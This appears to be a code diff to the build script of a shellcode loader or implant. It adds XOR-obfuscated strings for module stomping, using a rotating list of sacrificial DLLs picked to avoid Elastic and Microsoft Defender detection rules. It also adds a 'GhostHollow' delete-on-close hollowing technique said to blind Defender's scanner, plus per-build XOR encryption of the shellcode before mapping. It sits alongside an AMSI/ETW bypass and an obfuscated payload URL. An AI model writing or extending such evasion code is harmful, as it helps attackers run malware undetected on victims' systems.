@@ -36,8 +36,13 @@ OBFUSCATED_STRINGS = {
     "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "XSTR_HTTP_GET":                "GET",
     "XSTR_HTTP_QUERY_INFO_A":       "HttpQueryInfoA",
-    # Stomper.c (sacrificial DLL for module stomping / phantom hollowing)
-    "XSTR_STOMP_DLL":               "msftedit.dll",
+    # Sacrificial DLL allowlist (multimedia / debug / printing — low-sensitivity
+    # categories not on Elastic/MDE public stomp-target rules; rotate randomly
+    # per run via RDTSC). Loader picks one that's present and has enough .text.
+    "XSTR_STOMP_DLL_1":             "xpsservices.dll",
+    "XSTR_STOMP_DLL_2":             "mfreadwrite.dll",
+    "XSTR_STOMP_DLL_3":             "dbgcore.dll",
+    "XSTR_STOMP_DLL_4":             "mfsensorgroup.dll",
     # Evasion.c (patchless AMSI/ETW via VEH + hardware breakpoints)
     "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
     "XSTR_RTL_REMOVE_VEH":          "RtlRemoveVectoredExceptionHandler",
@@ -68,6 +73,9 @@ OBFUSCATED_STRINGS = {
     "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
     "XSTR_CREATE_FIBER":            "CreateFiber",
     "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
+    # GhostHollow.c (FILE_FLAG_DELETE_ON_CLOSE-backed image section — no NTFS
+    # transaction, so Defender's MpFilter transaction-aware scanner is blind)
+    "XSTR_DELETE_FILE_A":           "DeleteFileA",
 }
 
 
@@ -286,6 +294,15 @@ def main():
     lines.append(f"#define URL_XOR_KEY     0x{url_xor_key:02X}")
     lines.append(f"#define URL_LENGTH      {len(url_bytes)}")
     lines.append(f"#define USE_COMPRESSION {1 if use_compression else 0}")
+    lines.append("")
+    # Per-build 16-byte XOR key for Phantom/Ghost placement write encryption.
+    # The decrypted shellcode is XOR'd against this key BEFORE being written
+    # to the transacted/delete-on-close file (Defender's MpFilter sees garbage),
+    # then decrypted in-place AFTER NtMapViewOfSection by flipping protection
+    # to RW and XOR'ing again, then flipping back to RX/RWX.
+    placement_xor = bytes(random.randint(0, 255) for _ in range(16))
+    lines.append(format_initializer("INIT_PLACEMENT_XOR_KEY", placement_xor))
+    lines.append("#define PLACEMENT_XOR_KEY_LEN 16")
     lines.append("")
     lines.append("// 4-byte string obfuscation key (randomized per build)")
     for i, k in enumerate(xkeys):
